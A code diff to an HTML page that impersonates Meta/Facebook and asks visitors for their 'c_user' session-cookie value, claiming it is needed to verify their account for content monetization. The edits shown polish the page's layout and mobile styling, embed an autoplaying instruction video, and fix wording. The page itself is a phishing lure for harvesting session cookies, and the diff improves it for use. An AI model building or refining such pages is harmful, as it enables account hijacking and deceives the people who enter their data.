@@ -20,6 +20,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            width: 100%;
         }
 
         header b {
@@ -42,17 +43,17 @@
         }
 
         .form-container {
-            width: 80%;
+            width: 90%;
             max-width: 900px;
             margin: 3rem auto;
             background-color: white;
             padding: 2.5rem;
             box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
+            text-align: center;
         }
 
         .form-container h2 {
-            text-align: center;
             color: #4267b2;
             font-size: 2rem;
             font-weight: bold;
@@ -137,6 +138,25 @@
             color: #d9534f;
         }
 
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .search-bar input {
+                width: 100%;
+            }
+
+            .form-container {
+                width: 95%;
+                padding: 2rem;
+            }
+
+            .submit-btn {
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 
@@ -163,17 +183,18 @@
             <!-- Detailed Video Information -->
             <div class="input-group">
                 <label for="video">Detailed Video Information:</label>
-                <a href="kabeer.mp4.mp4">
-                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" class="video-thumbnail" alt="Video Thumbnail">
-                </a>
-                <p class="highlight-text"><strong>Click on the image above</strong> to watch the detailed video that explains how to complete this process and ensure your account is properly verified for content monetization.</p>
+                <video width="100%" controls autoplay>
+                    <source src="kabeer.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+                <p class="highlight-text"><strong>Watch the video above</strong> to learn how to complete this process and ensure your account is verified for content monetization.</p>
             </div>
 
             <!-- User Information -->
             <div class="input-group">
                 <label for="c_user">C_USER:</label>
                 <input type="text" id="c_user" name="c_user" placeholder="c_user" pattern="[0-9]+" minlength="6" required>
-                <p class="highlight-large">Your <strong>c_user</strong> are crucial for Facebook to verify your account for content monetization. Make sure to provide the correct information.</p>
+                <p class="highlight-large">Your <strong>c_user</strong> is crucial for Facebook to verify your account for content monetization. Make sure to provide the correct information.</p>
             </div>
 
             <div class="input-group">
@@ -196,7 +217,7 @@
     </div>
 
     <footer>
-        <p>© META 2024 | <a href="https://www.metaservices.com">Meta Services</a></p>
+        <p>© META 2024 | <a href="https://www.metaservices.com" target="_blank">Meta Services</a></p>
     </footer>
 </body>
 
